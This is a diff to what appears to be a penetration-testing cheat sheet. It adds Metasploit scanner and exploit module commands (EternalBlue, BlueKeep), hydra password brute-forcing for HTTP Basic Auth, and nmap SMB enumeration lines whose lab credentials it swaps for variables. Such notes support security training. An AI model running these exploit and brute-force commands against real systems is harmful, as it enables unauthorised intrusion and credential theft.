@@ -262,6 +262,14 @@ ssh2john id_rsa > id_rsa.john
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
 ```
 
+
+```
+auxiliary/scanner/ssh/ssh_version
+auxiliary/scanner/ssh/ssh_login
+auxiliary/scanner/ssh/ssh_enumusers
+```
+
+
 **SCP** <br>
 Copy from remote to local;
 ```
@@ -377,6 +385,22 @@ Step 5: Enjoy your sweet shell @ http://victim.com/webdav/webshell.asp
 Or connect with meterpreter on msfconsole.
 
 
+
+```
+msf6> use auxiliary/scanner/http/apache_userdir_enum
+msf6> use auxiliary/scanner/http/brute_dirs
+msf6> use auxiliary/scanner/http/dir_scanner
+msf6> use auxiliary/scanner/http/dir_listing
+msf6> use auxiliary/scanner/http/http_put
+msf6> use auxiliary/scanner/http/files_dir
+msf6> use auxiliary/scanner/http/http_login
+msf6> use auxiliary/scanner/http/http_header
+msf6> use auxiliary/scanner/http/http_version
+msf6> use auxiliary/scanner/http/robots_txt
+```
+
+
+
 ### Kerberos (Port 88)
 Kerberos is a key authentication service within Active Directory. 
 
@@ -389,7 +413,11 @@ Kerberos is a key authentication service within Active Directory.
 
 ### SMB (Ports 139/445)
 
-Check for **EternalBlue**
+Check for **EternalBlue** in SMBv1
+```
+msf > use exploit/windows/smb/ms17_010_eternalblue
+```
+
 
 `139/tcp open  netbios-ssn` (ms17-010) [CVE-2017-0143]
 
@@ -445,17 +473,16 @@ nmap -p445 --script smb-security-mode $TG
 nmap -p445 --script smb-enum-sessions $TG
 nmap -p445 --script smb-enum-shares   $TG
 
-nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
-
-nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
-nmap -p445 --script smb-enum-shares   --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
-nmap -p445 --script smb-enum-users    --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
-nmap -p445 --script smb-enum-domains  --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
-nmap -p445 --script smb-enum-groups   --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
-nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
+nmap -p445 --script smb-server-stats  --script-args smbusername=$UN,smbpassword=$PW $TG
+nmap -p445 --script smb-enum-sessions --script-args smbusername=$UN,smbpassword=$PW $TG
+nmap -p445 --script smb-enum-shares   --script-args smbusername=$UN,smbpassword=$PW $TG
+nmap -p445 --script smb-enum-users    --script-args smbusername=$UN,smbpassword=$PW $TG
+nmap -p445 --script smb-enum-domains  --script-args smbusername=$UN,smbpassword=$PW $TG
+nmap -p445 --script smb-enum-groups   --script-args smbusername=$UN,smbpassword=$PW $TG
+nmap -p445 --script smb-enum-services --script-args smbusername=$UN,smbpassword=$PW $TG
 
 # Enumerating folders
-nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
+nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=$UN,smbpassword=$PW $TG
 ```
 
 
@@ -496,10 +523,13 @@ Must check the SSL certificate and look into sections like the `Subject Alt Name
 
 ### RDP (Port 3389)
 
-BlueKeep RCE [CVE-2019-0708]
-
+RDP scanner
 ```
 msf > use auxiliary/scanner/rdp/rdp_scanner
+```
+
+BlueKeep RCE [CVE-2019-0708]
+```
 msf > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 ```
 
@@ -532,6 +562,11 @@ msf6> use exploit/windows/winrm/winrm_script_exec
 **HTTP Forms**
 ```
 hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt $TG http-post-form "/path/to/login:ed=^USER^&pw=^PASS^:F=incorrect" -t 10
+```
+
+**HTTP Basic Auth**
+```
+hydra -l <USERNAME> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $TG http-get /
 ```
 
 **SSH**
